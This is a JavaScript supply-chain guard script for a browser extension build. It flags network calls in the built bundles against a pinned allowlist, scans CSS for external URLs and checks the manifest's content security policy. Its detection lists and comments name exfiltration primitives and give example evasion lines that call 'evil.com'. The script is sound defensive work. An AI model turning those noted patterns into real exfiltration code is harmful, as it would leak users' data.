#!/usr/bin/env node
// ──────────────────────────────────────────────────────────────────────
// audit-network.mjs — AST-based post-build supply-chain guard
//
// Parses every JS file in the build output with Babel and walks the AST
// to find network-capable constructs. Each finding is checked against a
// location-pinned allowlist so one legitimate call can never cover for a
// malicious neighbour on the same line.
//
// NOTE: This scanner catches DIRECT references only. Alias-based evasion
// (const f = fetch; f()) is handled at runtime by lib/network-lockdown.ts
// which hooks the actual APIs. Together they form defence-in-depth:
//   - Scanner:  catches obvious additions a dep shouldn't have
//   - Lockdown: intercepts calls regardless of aliasing/indirection
//
// Usage:  node scripts/audit-network.mjs [output-dir]
//         Default output-dir: .output/chrome-mv3
// ──────────────────────────────────────────────────────────────────────
import { readFileSync, readdirSync, statSync } from "node:fs";
import { join, relative } from "node:path";
import { parse } from "@babel/parser";
import _traverse from "@babel/traverse";

// Handle both ESM default and CJS interop
const traverse = typeof _traverse === "function" ? _traverse : _traverse.default;

const OUTPUT_DIR = process.argv[2] || ".output/chrome-mv3";

// ── Dangerous globals / constructors ────────────────────────────────
// Direct references to these as identifiers are suspicious.
const DANGEROUS_GLOBALS = new Set([
  "fetch",
  "XMLHttpRequest",
  "WebSocket",
  "EventSource",
  "RTCPeerConnection",
  "RTCDataChannel",
  "RTCSctpTransport",
  "importScripts",
]);

// Property names that are dangerous when called on an object.
// Only flagged on MemberExpression calls (obj.sendBeacon(), etc.)
const DANGEROUS_METHODS = new Set([
  "sendBeacon",           // navigator.sendBeacon
  "createDataChannel",    // RTCPeerConnection.createDataChannel
  "createOffer",          // RTCPeerConnection.createOffer
  "createAnswer",         // RTCPeerConnection.createAnswer
  "setRemoteDescription", // RTCPeerConnection.setRemoteDescription
  "addIceCandidate",      // RTCPeerConnection.addIceCandidate
]);

// Dangerous when used with `new`
const DANGEROUS_CONSTRUCTORS = new Set([
  "Worker",
  "SharedWorker",
  "Function",   // new Function("return fetch")()
  "Image",      // new Image().src = "https://evil.com?data=..."
]);

// ── Allowlist ─────────────────────────────────────────���─────────────
// Each entry pins a finding to a specific file and code snippet.
// `file` is matched as a substring against the relative path.
// `snippet` is matched against the source text at the call site.
// `kind` must match the finding kind exactly.
//
// Because we match per-finding (not per-line), a malicious call next
// to an allowed one will NOT be covered.
const ALLOWLIST = [
  // ── network-lockdown.ts (compiled into every entrypoint) ──────
  // The lockdown hooks globalThis.fetch/XMLHttpRequest/WebSocket/etc.
  // It references these globals to check existence and override them.
  // Pattern: one "ref" allowlist per global per entrypoint.
  ...["background.js", "sidepanel", "welcome"].flatMap((file) => [
    { file, kind: "ref", snippet: "globalThis.fetch" },
    { file, kind: "ref", snippet: "globalThis.XMLHttpRequest" },
    { file, kind: "ref", snippet: "globalThis.WebSocket" },
    { file, kind: "ref", snippet: "globalThis.EventSource" },
    { file, kind: "ref", snippet: "globalThis.RTCPeerConnection" },
    // The lockdown's proxy function calls the saved original fetch
    { file, kind: "call", snippet: "credentials:`omit`" },
  ]),

  // ── welcome chunk ─────────────────────────────────────────────
  // WXT modulepreload polyfill (same as sidepanel chunk).
  { file: "welcome", kind: "call", snippet: "fetch(e.href," },

  // ── background.js — legitimate fetch calls ────────────────────
  // Fetch PGP key from user-right-clicked link
  {
    file: "background.js",
    kind: "call",
    snippet: "fetch(n.linkUrl,{redirect:",
  },

  // ── sidepanel chunk ───────────────────────────────────────────
  // WXT modulepreload polyfill
  {
    file: "sidepanel",
    kind: "call",
    snippet: "fetch(e.href,",
  },
  // Load WASM binary from extension bundle
  {
    file: "sidepanel",
    kind: "call",
    snippet: "fetch(t).then(",
  },
  // Dynamic import for local gpg_wasm code-split chunk
  {
    file: "sidepanel",
    kind: "dynamic-import",
    snippet: "gpg_wasm",
  },

  // ── gpg_wasm chunk — wasm-bindgen init loader ─────────────────
  {
    file: "gpg_wasm",
    kind: "call",
    snippet: "fetch(t))",
  },
];

// ── Collect files by extension ──────────────────────────────────────
function collectFiles(dir, ext) {
  const files = [];
  for (const entry of readdirSync(dir)) {
    const full = join(dir, entry);
    const stat = statSync(full);
    if (stat.isDirectory()) {
      files.push(...collectFiles(full, ext));
    } else if (entry.endsWith(ext)) {
      files.push(full);
    }
  }
  return files;
}

// ── Extract source snippet around a node ────────────────────────────
function snippetAt(source, node, contextChars = 80) {
  const start = Math.max(0, node.start - 10);
  const end = Math.min(source.length, node.end + contextChars);
  return source.slice(start, end);
}

// ── Main scan ───────────────────────────────────────────────────────
function scanFile(filePath, relPath) {
  const source = readFileSync(filePath, "utf-8");
  let ast;
  try {
    ast = parse(source, {
      sourceType: "module",
      allowImportExportEverywhere: true,
      plugins: ["dynamicImport", "importMeta"],
      errorRecovery: true,
    });
  } catch (e) {
    console.warn(`  ⚠ Could not parse ${relPath}: ${e.message}`);
    return [];
  }

  const findings = [];

  function addFinding(kind, name, node, detail) {
    const snippet = snippetAt(source, node);
    findings.push({
      file: relPath,
      kind,
      name,
      detail: detail || name,
      start: node.start,
      end: node.end,
      snippet,
    });
  }

  traverse(ast, {
    // ── Calls: fetch(), navigator.sendBeacon(), window["fetch"]() ──
    CallExpression(path) {
      const callee = path.node.callee;

      // eval()
      if (callee.type === "Identifier" && callee.name === "eval") {
        addFinding("eval", "eval", path.node);
        return;
      }

      // Dynamic import(): import("https://evil.com/x.js")
      // Babel parses this as CallExpression with callee type "Import"
      if (callee.type === "Import") {
        addFinding("dynamic-import", "import()", path.node);
        return;
      }

      // Direct identifier call: fetch(), XMLHttpRequest(), etc.
      if (callee.type === "Identifier" && DANGEROUS_GLOBALS.has(callee.name)) {
        addFinding("call", callee.name, path.node);
        return;
      }

      // Method call: obj.sendBeacon(), obj.createDataChannel(), obj.fetch()
      if (
        callee.type === "MemberExpression" &&
        !callee.computed &&
        callee.property.type === "Identifier"
      ) {
        const prop = callee.property.name;
        if (DANGEROUS_GLOBALS.has(prop) || DANGEROUS_METHODS.has(prop)) {
          addFinding("call", prop, path.node);
          return;
        }
      }

      // Computed property calls: window["fetch"](), obj["sendBeacon"]()
      if (
        callee.type === "MemberExpression" &&
        callee.computed &&
        callee.property.type === "StringLiteral"
      ) {
        const prop = callee.property.value;
        if (DANGEROUS_GLOBALS.has(prop) || DANGEROUS_METHODS.has(prop)) {
          addFinding("call", prop, path.node, `computed["${prop}"]`);
        }
      }
    },

    // ── new X(): new WebSocket(), new Worker(), new Function() ──────
    NewExpression(path) {
      const callee = path.node.callee;
      let name = null;

      if (callee.type === "Identifier") {
        name = callee.name;
      } else if (
        callee.type === "MemberExpression" &&
        !callee.computed &&
        callee.property.type === "Identifier"
      ) {
        name = callee.property.name;
      }

      if (name && (DANGEROUS_GLOBALS.has(name) || DANGEROUS_CONSTRUCTORS.has(name))) {
        addFinding("new", name, path.node, `new ${name}`);
      }
    },

    // ── Dynamic import() — ImportExpression variant ─────────────────
    ImportExpression(path) {
      addFinding("dynamic-import", "import()", path.node);
    },

    // ── Bare references: const x = fetch (not a call, but captures it) ──
    // Catches alias setup: const f = fetch, const f = globalThis.fetch
    // These are flagged as "ref" so the allowlist can distinguish them
    // from actual calls.
    Identifier(path) {
      if (!DANGEROUS_GLOBALS.has(path.node.name)) return;

      // Skip if this identifier is being called (handled by CallExpression)
      // or constructed (handled by NewExpression)
      const parent = path.parent;
      if (
        parent.type === "CallExpression" && parent.callee === path.node
      ) return;
      if (
        parent.type === "NewExpression" && parent.callee === path.node
      ) return;

      // Skip property access keys: obj.fetch (the "fetch" on the right)
      if (
        parent.type === "MemberExpression" && parent.property === path.node && !parent.computed
      ) return;

      // Skip object keys: { fetch: value }
      if (
        parent.type === "ObjectProperty" && parent.key === path.node
      ) return;

      // This is a bare reference — someone is reading the global (likely aliasing)
      addFinding("ref", path.node.name, path.node, `ref:${path.node.name}`);
    },

    // ── MemberExpression: globalThis.fetch, window.WebSocket ────────
    // Catches property access on known global carriers
    MemberExpression(path) {
      if (path.node.computed) return;
      if (path.node.property.type !== "Identifier") return;

      const prop = path.node.property.name;
      if (!DANGEROUS_GLOBALS.has(prop)) return;

      // Skip if parent is already a CallExpression (handled above)
      const parent = path.parent;
      if (parent.type === "CallExpression" && parent.callee === path.node) return;

      const obj = path.node.object;
      // Only flag on known global carriers
      if (
        obj.type === "Identifier" &&
        (obj.name === "globalThis" || obj.name === "window" || obj.name === "self")
      ) {
        addFinding("ref", prop, path.node, `${obj.name}.${prop}`);
      }
    },
  });

  return findings;
}

// ── CSS scanner ─────────────────────────────────────────────────────
// Catches exfiltration via url(), @import, @font-face pointing externally.
// CSP img-src/font-src blocks these at runtime, but we flag them at build
// time too so a malicious dep can't rely on a future CSP loosening.
const EXTERNAL_URL_RE = /url\(\s*["']?(https?:\/\/|\/\/)/gi;
const IMPORT_RE = /@import\s+(?:url\()?["']?(https?:\/\/|\/\/)/gi;

function scanCssFile(filePath, relPath) {
  const source = readFileSync(filePath, "utf-8");
  const findings = [];

  for (const re of [EXTERNAL_URL_RE, IMPORT_RE]) {
    re.lastIndex = 0;
    let match;
    while ((match = re.exec(source)) !== null) {
      const start = Math.max(0, match.index - 20);
      const end = Math.min(source.length, match.index + match[0].length + 80);
      findings.push({
        file: relPath,
        kind: "css-url",
        name: "external-url",
        detail: "external URL in CSS",
        start: match.index,
        end: match.index + match[0].length,
        snippet: source.slice(start, end),
      });
    }
  }
  return findings;
}

// ── Manifest CSP validator ──────────────────────────────────────────
// Ensures the built manifest.json contains the expected CSP directives.
// A malicious build plugin could strip or weaken the CSP.
function validateManifestCsp(outputDir) {
  const manifestPath = join(outputDir, "manifest.json");
  let manifest;
  try {
    manifest = JSON.parse(readFileSync(manifestPath, "utf-8"));
  } catch {
    console.error("  ⚠ Could not read manifest.json");
    return ["manifest.json not found or invalid"];
  }

  const csp = manifest.content_security_policy?.extension_pages ?? "";
  const errors = [];

  // Each directive must contain at least one of the acceptable tokens.
  // 'none' is strictly stronger than 'self' and always acceptable.
  const required = [
    ["default-src", ["'self'", "'none'"]],
    ["script-src", ["'self'"]],
    ["img-src", ["'self'", "'none'"]],
    ["font-src", ["'self'", "'none'"]],
    ["worker-src", ["'self'", "'none'"]],
    ["frame-src", ["'none'"]],
    ["form-action", ["'none'"]],
    ["object-src", ["'self'", "'none'"]],
  ];

  const escape = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  for (const [directive, values] of required) {
    const matched = values.some((v) =>
      new RegExp(`${directive}\\s+[^;]*${escape(v)}`).test(csp),
    );
    if (!matched) {
      errors.push(
        `Missing or wrong: ${directive} must include one of ${values.join(", ")}`,
      );
    }
  }

  // connect-src must NOT be '*' or missing
  if (/connect-src\s+[^;]*\*/.test(csp)) {
    errors.push("connect-src must not use wildcard '*'");
  }

  // script-src must NOT have 'unsafe-eval' (wasm-unsafe-eval is ok)
  if (/script-src\s+[^;]*'unsafe-eval'/.test(csp) && !/script-src\s+[^;]*'wasm-unsafe-eval'/.test(csp)) {
    errors.push("script-src must not include 'unsafe-eval'");
  }

  return errors;
}

// ── Run ─────────────────────────────────────────────────────────────
try {
  statSync(OUTPUT_DIR);
} catch {
  console.error(`ERROR: Build output not found at ${OUTPUT_DIR}`);
  console.error("       Run the build first, then re-run this script.");
  process.exit(1);
}

const jsFiles = collectFiles(OUTPUT_DIR, ".js");
const cssFiles = collectFiles(OUTPUT_DIR, ".css");

if (jsFiles.length === 0) {
  console.error(`ERROR: No .js files found in ${OUTPUT_DIR}`);
  process.exit(1);
}

let allFindings = [];

for (const file of jsFiles) {
  const rel = relative(OUTPUT_DIR, file);
  allFindings.push(...scanFile(file, rel));
}

for (const file of cssFiles) {
  const rel = relative(OUTPUT_DIR, file);
  allFindings.push(...scanCssFile(file, rel));
}

// Validate manifest CSP
const cspErrors = validateManifestCsp(OUTPUT_DIR);

// ── Check against allowlist ─────────────────────────────────────────
const unexpected = [];
const allowed = [];

for (const finding of allFindings) {
  let isAllowed = false;
  for (const entry of ALLOWLIST) {
    if (
      finding.file.includes(entry.file) &&
      finding.kind === entry.kind &&
      finding.snippet.includes(entry.snippet)
    ) {
      isAllowed = true;
      break;
    }
  }
  if (isAllowed) {
    allowed.push(finding);
  } else {
    unexpected.push(finding);
  }
}

// ── Report ──────────────────────────────────────────────────────────
console.log("");

if (unexpected.length > 0) {
  console.log("❌ UNEXPECTED NETWORK PRIMITIVES DETECTED");
  console.log(
    "   These were NOT in the allowlist and may indicate a supply-chain attack.\n",
  );
  for (const f of unexpected) {
    console.log(`   ${f.file}:${f.start}  [${f.kind}] ${f.detail}`);
    // Show a trimmed snippet
    const trimmed = f.snippet.replace(/\s+/g, " ").slice(0, 120);
    console.log(`   │ ${trimmed}…`);
    console.log("");
  }
}

// ── CSP report ──────────────────────────────────────────────────────
if (cspErrors.length > 0) {
  console.log("❌ MANIFEST CSP VALIDATION FAILED");
  console.log(
    "   The built manifest.json has a weakened or missing CSP.\n",
  );
  for (const err of cspErrors) {
    console.log(`   • ${err}`);
  }
  console.log("");
}

console.log("── Summary ──────────────────────────────────");
console.log(`   JS files scanned:   ${jsFiles.length}`);
console.log(`   CSS files scanned:  ${cssFiles.length}`);
console.log(`   Total findings:     ${allFindings.length}`);
console.log(`   Allowlisted:        ${allowed.length}`);
console.log(`   Unexpected:         ${unexpected.length}`);
console.log(`   CSP errors:         ${cspErrors.length}`);
console.log("");

if (unexpected.length > 0 || cspErrors.length > 0) {
  if (unexpected.length > 0) {
    console.log(
      "⚠️  Review the unexpected findings above.",
    );
    console.log(
      "   If legitimate, add them to the ALLOWLIST in scripts/audit-network.mjs",
    );
    console.log(
      "   If NOT expected, a dependency may be exfiltrating data.",
    );
  }
  if (cspErrors.length > 0) {
    console.log(
      "⚠️  Fix the CSP in wxt.config.ts — a build plugin may have weakened it.",
    );
  }
  process.exit(1);
}

console.log(`✅ All ${allFindings.length} finding(s) are allowlisted. CSP is intact.`);
